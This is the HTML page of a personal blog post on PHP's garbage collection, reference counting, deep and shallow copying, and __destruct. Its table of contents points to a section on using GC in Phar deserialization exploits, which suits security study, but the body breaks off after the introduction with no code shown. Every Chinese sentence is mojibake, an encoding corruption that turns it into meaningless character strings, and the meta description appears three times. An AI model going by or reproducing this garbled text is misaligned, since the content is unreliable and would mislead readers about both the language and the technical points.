<!DOCTYPE html>
<html lang="en-us" dir="ltr">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='PHPåº•å±‚ GC åƒåœ¾å›æ”¶æœºåˆ¶ PHP: å¼•ç”¨è®¡æ•°åŸºæœ¬çŸ¥è¯† - Manual
å»ºè®®ä¸€å®šå…ˆçœ‹å®Œ PHPå®˜æ–¹æ‰‹å†Œçš„è¯´æ˜
ç®€å•ç†è§£ä¸ºä¸€ä¸ªå¯¹è±¡æ²¡æœ‰è¢«å¼•ç”¨çš„æ—¶å€™ å°±ä¼šè¢«GCæœºåˆ¶å›æ”¶ åœ¨è¢«å›æ”¶çš„åŒæ—¶ ä¼šè§¦å‘__destruct()æ–¹æ³• è¿™æ˜¯ä¸€ä¸ªå…³é”®ç‚¹~
refcountå˜é‡å¼•ç”¨è®¡æ•° is_refæ˜¯å¦è¢«å¼•ç”¨ boolå€¼
è°ƒè¯•å·¥å…·Xdebug - Debugger and Profiler Tool for PHP å¦‚æœæ˜¯å°çš®é¢æ¿çš„è¯ç›´æ¥ phpæ‰©å±•å¼€å¯å°±è¡Œäº†
PHPä¸åŒç‰ˆæœ¬ä¸‹GCæœºåˆ¶æœ‰å˜åŒ– ä»¥ä¸‹ç¯å¢ƒä¸ºPHP 5.4.45æ¨¡æ‹Ÿ
PHP æ·±æµ…æ‹·è´ åœ¨ PHP ä¸­å¼•ç”¨æ„å‘³ç€ç”¨ä¸åŒçš„åå­—è®¿é—®åŒä¸€ä¸ªå˜é‡å†…å®¹ã€‚è¿™å¹¶ä¸åƒ C çš„æŒ‡é’ˆï¼šä¾‹å¦‚ä½ ä¸èƒ½å¯¹ä»–ä»¬åšæŒ‡é’ˆè¿ç®—ï¼Œä»–ä»¬å¹¶ä¸æ˜¯å®é™…çš„å†…å­˜åœ°å€ã€‚æ›¿ä»£çš„æ˜¯ï¼Œå¼•ç”¨æ˜¯ç¬¦å·è¡¨åˆ«åã€‚æ³¨æ„åœ¨PHP ä¸­ï¼Œå˜é‡åå’Œå˜é‡å†…å®¹æ˜¯ä¸ä¸€æ ·çš„ï¼Œå› æ­¤åŒæ ·çš„å†…å®¹å¯ä»¥æœ‰ä¸åŒçš„åå­—ã€‚æœ€æ¥è¿‘çš„æ¯”å–»æ˜¯ Unix çš„æ–‡ä»¶åå’Œæ–‡ä»¶æœ¬èº«â€”â€”å˜é‡åæ˜¯ç›®å½•æ¡ç›®ï¼Œè€Œå˜é‡å†…å®¹åˆ™æ˜¯æ–‡ä»¶æœ¬èº«ã€‚å¼•ç”¨å¯ä»¥è¢«çœ‹ä½œæ˜¯ Unix æ–‡ä»¶ç³»ç»Ÿä¸­çš„ç¡¬é“¾æ¥
å¼•ç”¨å–æ¶ˆ åˆ™éœ€è¦ä½¿ç”¨unset()åªæ˜¯æ–­å¼€äº†å˜é‡åå’Œå˜é‡å†…å®¹ä¹‹é—´çš„ç»‘å®š,å¹¶ä¸æ˜¯è¯´å˜é‡å†…å®¹è¢«é”€æ¯äº†
æ·±æ‹·è´ï¼š èµ‹å€¼æ—¶å€¼å®Œå…¨å¤åˆ¶å¯¹å…¶ä¸­ä¸€ä¸ªä½œå‡ºæ”¹å˜ï¼Œä¸ä¼šå½±å“å¦ä¸€ä¸ª
åœ¨PHP5ä»¥ä¸Šï¼Œå¯¹è±¡çš„ = èµ‹å€¼å’Œä¼ é€’éƒ½æ˜¯å¼•ç”¨(æµ…)ã€‚phpæä¾›äº†cloneå‡½æ•°å®ç°æ‹·è´å‰¯æœ¬
ç›´æ¥æŠŠ$aèµ‹å€¼ç»™$bä¹‹åï¼Œ$bä¿®æ”¹å¹¶ä¸ä¼šå¯¹$aä»»ä½•å½±å“ï¼Œå¯ä»¥çœ‹åˆ°2æ¬¡è¾“å‡ºéƒ½æ˜¯main1o
å˜é‡$aå¼•ç”¨è®¡æ•°å€¼refcountä¹Ÿä¸º1ï¼Œå¹¶ä¸”is_refä¹Ÿæ˜¯false
å¯¹è±¡çš„æ·±æ‹·è´ ç”¨cloneå‡½æ•°æ‹·è´å‡ºä¸€ä¸ªå®Œå…¨ä¸€æ ·çš„å¯¹è±¡ï¼Œä¿®æ”¹è¯¥å¯¹è±¡ï¼Œå¹¶ä¸ä¼šå½±å“åŸå§‹å¯¹è±¡
ä¿®æ”¹$aå¯¹è±¡ï¼Œåªä¼šå¯¹$bå¯¹è±¡æœ‰å½±å“ï¼Œå¹¶ä¸ä¼šå¯¹$cå¯¹è±¡æœ‰ä»»ä½•å½±å“
æµ…æ‹·è´ï¼š èµ‹å€¼æ—¶ï¼Œå¼•ç”¨èµ‹å€¼ï¼Œç›¸å½“äºå–äº†ä¸€ä¸ªåˆ«åã€‚å¯¹å…¶ä¸­ä¸€ä¸ªä¿®æ”¹ï¼Œä¼šå½±å“å¦ä¸€ä¸ª
ä½¿ç”¨&amp;amp;æ¥ä½¿ç”¨è‡ªå®šä¹‰å¼•ç”¨å˜é‡ï¼Œæˆ‘ä»¬å¯¹$aè¿›è¡Œä¿®æ”¹ ç›´æ¥å½±å“äº†$b â€œmain1oâ€ &amp;ndash;&amp;gt; &amp;ldquo;ikun&amp;rdquo;
å°±æ˜¯$a å’Œ$béƒ½æŒ‡å‘å†…å­˜ä¸­çš„åŒä¸€å—åœ°å€
ååºåˆ—åŒ–ä¸­çš„ä½œç”¨ è¡¥å……ï¼š
æ–¹æ³•å ä½œç”¨ __construct æ„é€ å‡½æ•°ï¼Œåœ¨åˆ›å»ºå¯¹è±¡æ—¶å€™åˆå§‹åŒ–å¯¹è±¡ï¼Œä¸€èˆ¬ç”¨äºå¯¹å˜é‡èµ‹åˆå€¼ __destruct ææ„å‡½æ•°ï¼Œå’Œæ„é€ å‡½æ•°ç›¸åï¼Œåœ¨å¯¹è±¡ä¸å†è¢«ä½¿ç”¨æ—¶(å°†æ‰€æœ‰è¯¥å¯¹è±¡çš„å¼•ç”¨è®¾ä¸ºnull)æˆ–è€…ç¨‹åºé€€å‡ºæ—¶è‡ªåŠ¨è°ƒç”¨ å³å¯¹è±¡è¢«é”€æ¯è§¦å‘ï¼æ‰‹åŠ¨é”€æ¯ä¸ºunset(Object) æ‰‹åŠ¨é”€æ¯å¯¹è±¡unset()è§¦å‘äº†$aå¯¹è±¡ä¸­çš„ææ„å‡½æ•°ã€‚æå‰è¾“å‡ºäº† 1__destruct()'>
<title>PHP_GCåƒåœ¾å›æ”¶æœºåˆ¶</title>

<link rel='canonical' href='http://main1o.github.io/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/'>

<link rel="stylesheet" href="/scss/style.min.a2ee76acb499924e28da470c2b4d2593db002137becb82ad8e674bc5f9830c4f.css"><meta property='og:title' content='PHP_GCåƒåœ¾å›æ”¶æœºåˆ¶'>
<meta property='og:description' content='PHPåº•å±‚ GC åƒåœ¾å›æ”¶æœºåˆ¶ PHP: å¼•ç”¨è®¡æ•°åŸºæœ¬çŸ¥è¯† - Manual
å»ºè®®ä¸€å®šå…ˆçœ‹å®Œ PHPå®˜æ–¹æ‰‹å†Œçš„è¯´æ˜
ç®€å•ç†è§£ä¸ºä¸€ä¸ªå¯¹è±¡æ²¡æœ‰è¢«å¼•ç”¨çš„æ—¶å€™ å°±ä¼šè¢«GCæœºåˆ¶å›æ”¶ åœ¨è¢«å›æ”¶çš„åŒæ—¶ ä¼šè§¦å‘__destruct()æ–¹æ³• è¿™æ˜¯ä¸€ä¸ªå…³é”®ç‚¹~
refcountå˜é‡å¼•ç”¨è®¡æ•° is_refæ˜¯å¦è¢«å¼•ç”¨ boolå€¼
è°ƒè¯•å·¥å…·Xdebug - Debugger and Profiler Tool for PHP å¦‚æœæ˜¯å°çš®é¢æ¿çš„è¯ç›´æ¥ phpæ‰©å±•å¼€å¯å°±è¡Œäº†
PHPä¸åŒç‰ˆæœ¬ä¸‹GCæœºåˆ¶æœ‰å˜åŒ– ä»¥ä¸‹ç¯å¢ƒä¸ºPHP 5.4.45æ¨¡æ‹Ÿ
PHP æ·±æµ…æ‹·è´ åœ¨ PHP ä¸­å¼•ç”¨æ„å‘³ç€ç”¨ä¸åŒçš„åå­—è®¿é—®åŒä¸€ä¸ªå˜é‡å†…å®¹ã€‚è¿™å¹¶ä¸åƒ C çš„æŒ‡é’ˆï¼šä¾‹å¦‚ä½ ä¸èƒ½å¯¹ä»–ä»¬åšæŒ‡é’ˆè¿ç®—ï¼Œä»–ä»¬å¹¶ä¸æ˜¯å®é™…çš„å†…å­˜åœ°å€ã€‚æ›¿ä»£çš„æ˜¯ï¼Œå¼•ç”¨æ˜¯ç¬¦å·è¡¨åˆ«åã€‚æ³¨æ„åœ¨PHP ä¸­ï¼Œå˜é‡åå’Œå˜é‡å†…å®¹æ˜¯ä¸ä¸€æ ·çš„ï¼Œå› æ­¤åŒæ ·çš„å†…å®¹å¯ä»¥æœ‰ä¸åŒçš„åå­—ã€‚æœ€æ¥è¿‘çš„æ¯”å–»æ˜¯ Unix çš„æ–‡ä»¶åå’Œæ–‡ä»¶æœ¬èº«â€”â€”å˜é‡åæ˜¯ç›®å½•æ¡ç›®ï¼Œè€Œå˜é‡å†…å®¹åˆ™æ˜¯æ–‡ä»¶æœ¬èº«ã€‚å¼•ç”¨å¯ä»¥è¢«çœ‹ä½œæ˜¯ Unix æ–‡ä»¶ç³»ç»Ÿä¸­çš„ç¡¬é“¾æ¥
å¼•ç”¨å–æ¶ˆ åˆ™éœ€è¦ä½¿ç”¨unset()åªæ˜¯æ–­å¼€äº†å˜é‡åå’Œå˜é‡å†…å®¹ä¹‹é—´çš„ç»‘å®š,å¹¶ä¸æ˜¯è¯´å˜é‡å†…å®¹è¢«é”€æ¯äº†
æ·±æ‹·è´ï¼š èµ‹å€¼æ—¶å€¼å®Œå…¨å¤åˆ¶å¯¹å…¶ä¸­ä¸€ä¸ªä½œå‡ºæ”¹å˜ï¼Œä¸ä¼šå½±å“å¦ä¸€ä¸ª
åœ¨PHP5ä»¥ä¸Šï¼Œå¯¹è±¡çš„ = èµ‹å€¼å’Œä¼ é€’éƒ½æ˜¯å¼•ç”¨(æµ…)ã€‚phpæä¾›äº†cloneå‡½æ•°å®ç°æ‹·è´å‰¯æœ¬
ç›´æ¥æŠŠ$aèµ‹å€¼ç»™$bä¹‹åï¼Œ$bä¿®æ”¹å¹¶ä¸ä¼šå¯¹$aä»»ä½•å½±å“ï¼Œå¯ä»¥çœ‹åˆ°2æ¬¡è¾“å‡ºéƒ½æ˜¯main1o
å˜é‡$aå¼•ç”¨è®¡æ•°å€¼refcountä¹Ÿä¸º1ï¼Œå¹¶ä¸”is_refä¹Ÿæ˜¯false
å¯¹è±¡çš„æ·±æ‹·è´ ç”¨cloneå‡½æ•°æ‹·è´å‡ºä¸€ä¸ªå®Œå…¨ä¸€æ ·çš„å¯¹è±¡ï¼Œä¿®æ”¹è¯¥å¯¹è±¡ï¼Œå¹¶ä¸ä¼šå½±å“åŸå§‹å¯¹è±¡
ä¿®æ”¹$aå¯¹è±¡ï¼Œåªä¼šå¯¹$bå¯¹è±¡æœ‰å½±å“ï¼Œå¹¶ä¸ä¼šå¯¹$cå¯¹è±¡æœ‰ä»»ä½•å½±å“
æµ…æ‹·è´ï¼š èµ‹å€¼æ—¶ï¼Œå¼•ç”¨èµ‹å€¼ï¼Œç›¸å½“äºå–äº†ä¸€ä¸ªåˆ«åã€‚å¯¹å…¶ä¸­ä¸€ä¸ªä¿®æ”¹ï¼Œä¼šå½±å“å¦ä¸€ä¸ª
ä½¿ç”¨&amp;amp;æ¥ä½¿ç”¨è‡ªå®šä¹‰å¼•ç”¨å˜é‡ï¼Œæˆ‘ä»¬å¯¹$aè¿›è¡Œä¿®æ”¹ ç›´æ¥å½±å“äº†$b â€œmain1oâ€ &amp;ndash;&amp;gt; &amp;ldquo;ikun&amp;rdquo;
å°±æ˜¯$a å’Œ$béƒ½æŒ‡å‘å†…å­˜ä¸­çš„åŒä¸€å—åœ°å€
ååºåˆ—åŒ–ä¸­çš„ä½œç”¨ è¡¥å……ï¼š
æ–¹æ³•å ä½œç”¨ __construct æ„é€ å‡½æ•°ï¼Œåœ¨åˆ›å»ºå¯¹è±¡æ—¶å€™åˆå§‹åŒ–å¯¹è±¡ï¼Œä¸€èˆ¬ç”¨äºå¯¹å˜é‡èµ‹åˆå€¼ __destruct ææ„å‡½æ•°ï¼Œå’Œæ„é€ å‡½æ•°ç›¸åï¼Œåœ¨å¯¹è±¡ä¸å†è¢«ä½¿ç”¨æ—¶(å°†æ‰€æœ‰è¯¥å¯¹è±¡çš„å¼•ç”¨è®¾ä¸ºnull)æˆ–è€…ç¨‹åºé€€å‡ºæ—¶è‡ªåŠ¨è°ƒç”¨ å³å¯¹è±¡è¢«é”€æ¯è§¦å‘ï¼æ‰‹åŠ¨é”€æ¯ä¸ºunset(Object) æ‰‹åŠ¨é”€æ¯å¯¹è±¡unset()è§¦å‘äº†$aå¯¹è±¡ä¸­çš„ææ„å‡½æ•°ã€‚æå‰è¾“å‡ºäº† 1__destruct()'>
<meta property='og:url' content='http://main1o.github.io/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/'>
<meta property='og:site_name' content='main1o&#39;s Blog'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='php' /><meta property='article:published_time' content='2022-09-09T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-09-09T00:00:00&#43;00:00'/><meta property='og:image' content='http://main1o.github.io/image46.png' />
<meta name="twitter:title" content="PHP_GCåƒåœ¾å›æ”¶æœºåˆ¶">
<meta name="twitter:description" content="PHPåº•å±‚ GC åƒåœ¾å›æ”¶æœºåˆ¶ PHP: å¼•ç”¨è®¡æ•°åŸºæœ¬çŸ¥è¯† - Manual
å»ºè®®ä¸€å®šå…ˆçœ‹å®Œ PHPå®˜æ–¹æ‰‹å†Œçš„è¯´æ˜
ç®€å•ç†è§£ä¸ºä¸€ä¸ªå¯¹è±¡æ²¡æœ‰è¢«å¼•ç”¨çš„æ—¶å€™ å°±ä¼šè¢«GCæœºåˆ¶å›æ”¶ åœ¨è¢«å›æ”¶çš„åŒæ—¶ ä¼šè§¦å‘__destruct()æ–¹æ³• è¿™æ˜¯ä¸€ä¸ªå…³é”®ç‚¹~
refcountå˜é‡å¼•ç”¨è®¡æ•° is_refæ˜¯å¦è¢«å¼•ç”¨ boolå€¼
è°ƒè¯•å·¥å…·Xdebug - Debugger and Profiler Tool for PHP å¦‚æœæ˜¯å°çš®é¢æ¿çš„è¯ç›´æ¥ phpæ‰©å±•å¼€å¯å°±è¡Œäº†
PHPä¸åŒç‰ˆæœ¬ä¸‹GCæœºåˆ¶æœ‰å˜åŒ– ä»¥ä¸‹ç¯å¢ƒä¸ºPHP 5.4.45æ¨¡æ‹Ÿ
PHP æ·±æµ…æ‹·è´ åœ¨ PHP ä¸­å¼•ç”¨æ„å‘³ç€ç”¨ä¸åŒçš„åå­—è®¿é—®åŒä¸€ä¸ªå˜é‡å†…å®¹ã€‚è¿™å¹¶ä¸åƒ C çš„æŒ‡é’ˆï¼šä¾‹å¦‚ä½ ä¸èƒ½å¯¹ä»–ä»¬åšæŒ‡é’ˆè¿ç®—ï¼Œä»–ä»¬å¹¶ä¸æ˜¯å®é™…çš„å†…å­˜åœ°å€ã€‚æ›¿ä»£çš„æ˜¯ï¼Œå¼•ç”¨æ˜¯ç¬¦å·è¡¨åˆ«åã€‚æ³¨æ„åœ¨PHP ä¸­ï¼Œå˜é‡åå’Œå˜é‡å†…å®¹æ˜¯ä¸ä¸€æ ·çš„ï¼Œå› æ­¤åŒæ ·çš„å†…å®¹å¯ä»¥æœ‰ä¸åŒçš„åå­—ã€‚æœ€æ¥è¿‘çš„æ¯”å–»æ˜¯ Unix çš„æ–‡ä»¶åå’Œæ–‡ä»¶æœ¬èº«â€”â€”å˜é‡åæ˜¯ç›®å½•æ¡ç›®ï¼Œè€Œå˜é‡å†…å®¹åˆ™æ˜¯æ–‡ä»¶æœ¬èº«ã€‚å¼•ç”¨å¯ä»¥è¢«çœ‹ä½œæ˜¯ Unix æ–‡ä»¶ç³»ç»Ÿä¸­çš„ç¡¬é“¾æ¥
å¼•ç”¨å–æ¶ˆ åˆ™éœ€è¦ä½¿ç”¨unset()åªæ˜¯æ–­å¼€äº†å˜é‡åå’Œå˜é‡å†…å®¹ä¹‹é—´çš„ç»‘å®š,å¹¶ä¸æ˜¯è¯´å˜é‡å†…å®¹è¢«é”€æ¯äº†
æ·±æ‹·è´ï¼š èµ‹å€¼æ—¶å€¼å®Œå…¨å¤åˆ¶å¯¹å…¶ä¸­ä¸€ä¸ªä½œå‡ºæ”¹å˜ï¼Œä¸ä¼šå½±å“å¦ä¸€ä¸ª
åœ¨PHP5ä»¥ä¸Šï¼Œå¯¹è±¡çš„ = èµ‹å€¼å’Œä¼ é€’éƒ½æ˜¯å¼•ç”¨(æµ…)ã€‚phpæä¾›äº†cloneå‡½æ•°å®ç°æ‹·è´å‰¯æœ¬
ç›´æ¥æŠŠ$aèµ‹å€¼ç»™$bä¹‹åï¼Œ$bä¿®æ”¹å¹¶ä¸ä¼šå¯¹$aä»»ä½•å½±å“ï¼Œå¯ä»¥çœ‹åˆ°2æ¬¡è¾“å‡ºéƒ½æ˜¯main1o
å˜é‡$aå¼•ç”¨è®¡æ•°å€¼refcountä¹Ÿä¸º1ï¼Œå¹¶ä¸”is_refä¹Ÿæ˜¯false
å¯¹è±¡çš„æ·±æ‹·è´ ç”¨cloneå‡½æ•°æ‹·è´å‡ºä¸€ä¸ªå®Œå…¨ä¸€æ ·çš„å¯¹è±¡ï¼Œä¿®æ”¹è¯¥å¯¹è±¡ï¼Œå¹¶ä¸ä¼šå½±å“åŸå§‹å¯¹è±¡
ä¿®æ”¹$aå¯¹è±¡ï¼Œåªä¼šå¯¹$bå¯¹è±¡æœ‰å½±å“ï¼Œå¹¶ä¸ä¼šå¯¹$cå¯¹è±¡æœ‰ä»»ä½•å½±å“
æµ…æ‹·è´ï¼š èµ‹å€¼æ—¶ï¼Œå¼•ç”¨èµ‹å€¼ï¼Œç›¸å½“äºå–äº†ä¸€ä¸ªåˆ«åã€‚å¯¹å…¶ä¸­ä¸€ä¸ªä¿®æ”¹ï¼Œä¼šå½±å“å¦ä¸€ä¸ª
ä½¿ç”¨&amp;amp;æ¥ä½¿ç”¨è‡ªå®šä¹‰å¼•ç”¨å˜é‡ï¼Œæˆ‘ä»¬å¯¹$aè¿›è¡Œä¿®æ”¹ ç›´æ¥å½±å“äº†$b â€œmain1oâ€ &amp;ndash;&amp;gt; &amp;ldquo;ikun&amp;rdquo;
å°±æ˜¯$a å’Œ$béƒ½æŒ‡å‘å†…å­˜ä¸­çš„åŒä¸€å—åœ°å€
ååºåˆ—åŒ–ä¸­çš„ä½œç”¨ è¡¥å……ï¼š
æ–¹æ³•å ä½œç”¨ __construct æ„é€ å‡½æ•°ï¼Œåœ¨åˆ›å»ºå¯¹è±¡æ—¶å€™åˆå§‹åŒ–å¯¹è±¡ï¼Œä¸€èˆ¬ç”¨äºå¯¹å˜é‡èµ‹åˆå€¼ __destruct ææ„å‡½æ•°ï¼Œå’Œæ„é€ å‡½æ•°ç›¸åï¼Œåœ¨å¯¹è±¡ä¸å†è¢«ä½¿ç”¨æ—¶(å°†æ‰€æœ‰è¯¥å¯¹è±¡çš„å¼•ç”¨è®¾ä¸ºnull)æˆ–è€…ç¨‹åºé€€å‡ºæ—¶è‡ªåŠ¨è°ƒç”¨ å³å¯¹è±¡è¢«é”€æ¯è§¦å‘ï¼æ‰‹åŠ¨é”€æ¯ä¸ºunset(Object) æ‰‹åŠ¨é”€æ¯å¯¹è±¡unset()è§¦å‘äº†$aå¯¹è±¡ä¸­çš„ææ„å‡½æ•°ã€‚æå‰è¾“å‡ºäº† 1__destruct()"><meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content='http://main1o.github.io/image46.png' />
    <link rel="shortcut icon" href="/monv.ico" />

    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/avatar_hue529b319896f6e127fdae7ad4df2131d_604425_300x0_resize_box_3.png" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
                    <span class="emoji">ğŸ¥</span>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">main1o&#39;s Blog</a></h1>
            <h2 class="site-description">å­¦ä¹ ,éš¾é“ä¸æ˜¯äººç”Ÿæœ€æ£’çš„ä¹è¶£ä¹ˆ?</h2>
        </div>
    </header><ol class="menu" id="main-menu">
        
        
        

        <li >
            <a href='/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>Home</span>
            </a>
        </li>
        
        

        <li >
            <a href='/archives/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>Archives</span>
            </a>
        </li>
        
        

        <li >
            <a href='/search/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>Search</span>
            </a>
        </li>
        
        

        <li >
            <a href='/links' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
</svg>



                
                <span>Links</span>
            </a>
        </li>
        
        

        <li >
            <a href='/about/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="7" r="4" />
  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
</svg>



                
                <span>About</span>
            </a>
        </li>
        

        <div class="menu-bottom-section">
            
            
                <li id="dark-mode-toggle">
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="8" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="16" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                    <span>Dark Mode</span>
                </li>
            
        </div>
    </ol>
</aside>

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">Table of contents</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ol>
    <li><a href="#php-æ·±æµ…æ‹·è´">PHP æ·±æµ…æ‹·è´</a>
      <ol>
        <li><a href="#æ·±æ‹·è´">æ·±æ‹·è´ï¼š</a></li>
        <li><a href="#æµ…æ‹·è´">æµ…æ‹·è´ï¼š</a></li>
      </ol>
    </li>
    <li><a href="#ååºåˆ—åŒ–ä¸­çš„ä½œç”¨">ååºåˆ—åŒ–ä¸­çš„ä½œç”¨</a>
      <ol>
        <li><a href="#demo-">Demo :</a></li>
        <li><a href="#gc-pharååºåˆ—åŒ–åˆ©ç”¨">GC Pharååºåˆ—åŒ–åˆ©ç”¨:</a></li>
      </ol>
    </li>
    <li><a href="#ä¾‹é¢˜">ä¾‹é¢˜ï¼š</a></li>
    <li><a href="#å‚è€ƒé“¾æ¥">ğŸ”—å‚è€ƒé“¾æ¥</a></li>
  </ol>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    <article class="has-image main-article">
    <header class="article-header">
        <div class="article-image">
            <a href="/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/">
                
                    <img src="/image46.png" loading="lazy" alt="Featured image of post PHP_GCåƒåœ¾å›æ”¶æœºåˆ¶" />
                
            </a>
        </div>
    

    <div class="article-details">
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/p/php_gc%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/">PHP_GCåƒåœ¾å›æ”¶æœºåˆ¶</a>
        </h2>
    
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">2022-09-09</time>
            </div>
        

        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



                <time class="article-time--reading">
                    2 minute read
                </time>
            </div>
        
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <h1 id="phpåº•å±‚-gc-åƒåœ¾å›æ”¶æœºåˆ¶">PHPåº•å±‚ GC åƒåœ¾å›æ”¶æœºåˆ¶</h1>
<blockquote>
<p><a class="link" href="https://www.php.net/manual/zh/features.gc.refcounting-basics.php"  target="_blank" rel="noopener"
    >PHP: å¼•ç”¨è®¡æ•°åŸºæœ¬çŸ¥è¯† - Manual</a></p>
</blockquote>
<p><strong>å»ºè®®ä¸€å®šå…ˆçœ‹å®Œ PHPå®˜æ–¹æ‰‹å†Œçš„è¯´æ˜</strong></p>
